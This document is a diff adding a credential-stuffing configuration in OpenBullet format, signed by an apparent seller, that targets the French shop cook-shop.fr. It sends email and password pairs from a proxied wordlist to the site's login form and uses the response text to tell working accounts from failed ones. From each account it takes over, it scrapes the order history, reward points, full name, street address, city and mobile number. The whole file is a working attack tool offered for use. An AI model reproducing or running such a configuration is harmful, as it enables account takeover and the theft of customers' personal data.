@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "cook-shop.fr",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-16T03:51:08.6829103+02:00",
+  "AdditionalInfo": "Ne change pas l'auteur.",
+  "Author": "AlShark Seller#0049",
+  "Version": "1.3 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://cook-shop.fr/en/authentification" 
+  CONTENT "email=<USER>&passwd=<PASS>&back=my-account&SubmitLogin=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://cook-shop.fr" 
+  HEADER "Referer: https://cook-shop.fr/en/authentification?back=my-account" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password." 
+    KEY "There is 1 error" 
+  KEYCHAIN Success OR 
+    KEY "Welcome to your account" 
+
+REQUEST GET "https://cook-shop.fr/en/historique-des-commandes" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<p class=\"alert alert-warning\">" "</p>" -> CAP "Commandes:" 
+
+REQUEST GET "https://cook-shop.fr/en/module/allinone_rewards/rewards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<td style=\"text-align: center\">" "</td>" -> CAP "Total Recompenses:" 
+
+REQUEST GET "https://cook-shop.fr/en/adresses" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "account\" class=\"account\" rel=\"nofollow\"><span>" "</span></a>" -> CAP "Nom Complet:" 
+
+PARSE "<SOURCE>" LR "<span  class=\"address_address1\">" "</span>" -> CAP "Rue:" 
+
+PARSE "<SOURCE>" LR "<span  class=\"address_city\">" "</span>" -> CAP "Ville:" 
+
+PARSE "<SOURCE>" LR "<span  class=\"address_phone_mobile\">" "</span>" -> CAP "Num:" 
+
